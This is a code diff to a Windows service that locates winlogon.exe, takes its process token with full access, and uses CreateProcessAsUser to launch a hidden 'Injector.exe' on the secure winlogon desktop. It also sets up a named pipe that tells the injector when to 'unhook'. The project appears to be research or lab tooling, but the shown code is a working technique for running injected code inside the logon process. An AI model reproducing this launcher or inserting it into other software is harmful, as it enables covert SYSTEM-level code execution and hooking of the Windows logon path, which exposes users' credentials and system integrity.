@@ -32,17 +32,6 @@ void _printf(const char* format, ...)
 	OutputDebugString(wmsg);
 }
 
-void _wprintf(const wchar_t* format, ...)
-{
-	wchar_t msg[100];
-	va_list args;
-	va_start(args, format);
-	vswprintf(msg, sizeof(msg) / sizeof(wchar_t), format, args); // do check return value
-	va_end(args);
-	OutputDebugStringW(msg);
-}
-
-
 int _tmain(int argc, TCHAR *argv[])
 { 
 	SERVICE_TABLE_ENTRY ServiceTable[] =
@@ -59,10 +48,105 @@ int _tmain(int argc, TCHAR *argv[])
 	return 0;
 }
 
+DWORD findWinlogonProcess()
+{
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE)
+	{
+		return 0;
+	}
+
+	PROCESSENTRY32 processEntry;
+	processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(snapshot, &processEntry))
+	{
+		CloseHandle(snapshot);
+		return 0;
+	}
+
+	do
+	{
+		if (wcscmp(processEntry.szExeFile, L"winlogon.exe") == 0)
+		{
+			CloseHandle(snapshot);
+			return processEntry.th32ProcessID;
+		}
+	} while (Process32Next(snapshot, &processEntry));
+
+	CloseHandle(snapshot);
+	return 0;
+}
+
+
 void ServiceInit()
 {
+	LPWSTR injector_path = (LPWSTR)L"C:\\Users\\ISE\\source\\repos\\Injector\\x64\\Release\\Injector.exe";
+
 	// Create the named pipe to signal the injector when to unhook
 	hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 1024, 0, 0, NULL);
+
+	HANDLE service_token;
+
+	// get handle of the service
+	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+	if (pHandle)
+	{
+		_printf("Get Current Process Finished\n");
+
+		// get the token of the service
+		if (OpenProcessToken(pHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &service_token))
+		{
+			_printf("OpenProcessToken of the service Finished\n");
+			// find pid of winlogon.exe
+			DWORD logon_pid = findWinlogonProcess();
+			HANDLE winlogon_pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, logon_pid);
+			HANDLE winlogonToken;
+			
+			// get token of winlogon.exe
+			if (OpenProcessToken(winlogon_pHandle, TOKEN_ALL_ACCESS, &winlogonToken))
+			{
+				_printf("OpenProcessToken of winlogon.exe Finished\n");
+				STARTUPINFO si = { 0 };
+				PROCESS_INFORMATION pi = { 0 };
+
+				si.cb = sizeof(si);
+				si.lpDesktop = LPWSTR(L"winsta0\\winlogon");
+
+				si.dwFlags = STARTF_USESHOWWINDOW;
+				si.wShowWindow = SW_HIDE;
+
+				// create Injector Process in session1\winsta0\winlogon
+				BOOL create_process_ret = CreateProcessAsUser(winlogonToken, injector_path, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+				if (create_process_ret)
+				{
+					_printf("CreateProcessAsUser Finished\n");
+					CloseHandle(pi.hProcess);
+					CloseHandle(pi.hThread);
+				}
+				else
+				{
+					_printf("CreateProcessAsUser failed:%d\n", GetLastError());
+				}
+				CloseHandle(winlogonToken);
+			}
+			else
+			{
+				_printf("Open winlogon token failed:%d\n", GetLastError());
+			}
+			CloseHandle(winlogon_pHandle);
+			CloseHandle(service_token);
+		}
+		else
+		{
+			_printf("Open Process Token Failed%d\n", GetLastError());
+		}
+		CloseHandle(pHandle);
+	}
+	else
+	{
+		_printf("GetCurrentProcess Failed:%d\n", GetLastError());
+	}
 
 }
 
@@ -190,108 +274,15 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
 	}
 }
 
-DWORD findWinlogonProcess()
-{
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (snapshot == INVALID_HANDLE_VALUE)
-	{
-		return 0;
-	}
-
-	PROCESSENTRY32 processEntry;
-	processEntry.dwSize = sizeof(PROCESSENTRY32);
-
-	if (!Process32First(snapshot, &processEntry))
-	{
-		CloseHandle(snapshot);
-		return 0;
-	}
-
-	do
-	{
-		if (wcscmp(processEntry.szExeFile, L"winlogon.exe") == 0)
-		{
-			CloseHandle(snapshot);
-			return processEntry.th32ProcessID;
-		}
-	} while (Process32Next(snapshot, &processEntry));
-
-	CloseHandle(snapshot);
-	return 0;
-}
-
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
-	LPWSTR injector_path = (LPWSTR)L"C:\\Users\\ISE\\source\\repos\\Injector\\x64\\Release\\Injector.exe";
-	int do_once= 0;
+	
 	//  Periodically check if the service has been requested to stop
 	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
 	{
-		if (!do_once)
-		{
-			do_once = 1;
-			HANDLE service_token;
-			HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
-			if (pHandle)
-			{
-				_printf("Get Current Process Finished\n");
 
-				// get the token of the service
-				if (OpenProcessToken(pHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &service_token))
-				{
-					_printf("OpenProcessToken Finished\n");
-					DWORD logon_pid = findWinlogonProcess();
-					HANDLE winlogon_pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, logon_pid);
-					HANDLE winlogonToken;
-					if (OpenProcessToken(winlogon_pHandle, TOKEN_ALL_ACCESS, &winlogonToken))
-					{
-						_printf("OpenProcessToken Finished\n");
-						STARTUPINFO si = { 0 };
-						PROCESS_INFORMATION pi = { 0 };
-
-						si.cb = sizeof(si);
-						si.lpDesktop = LPWSTR(L"winsta0\\winlogon");
-
-						si.dwFlags = STARTF_USESHOWWINDOW;
-						si.wShowWindow = SW_HIDE;
-
-						BOOL create_process_ret = CreateProcessAsUser(winlogonToken, injector_path, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-						if (create_process_ret)
-						{
-							_printf("CreateProcessAsUser Finished\n");
-							CloseHandle(pi.hProcess);
-							CloseHandle(pi.hThread);
-						}
-						else
-						{
-							_printf("CreateProcessAsUser failed:%d\n", GetLastError());
-						}
-						CloseHandle(winlogonToken);
-					}
-					else
-					{
-						_printf("Open winlogon token failed:%d\n", GetLastError());
-					}
-					CloseHandle(winlogon_pHandle);
-					CloseHandle(service_token);
-				}
-				else
-				{
-					_printf("Open Process Token Failed%d\n", GetLastError());
-				}
-				CloseHandle(pHandle);
-			}
-			else
-			{
-				_printf("GetCurrentProcess Failed:%d\n", GetLastError());
-			}
-		}
-		else
-		{
-			Sleep(1000);
-		} 
-		
-		
+		// simulate work of the service
+		Sleep(1000);
 	}
 
 	return ERROR_SUCCESS;
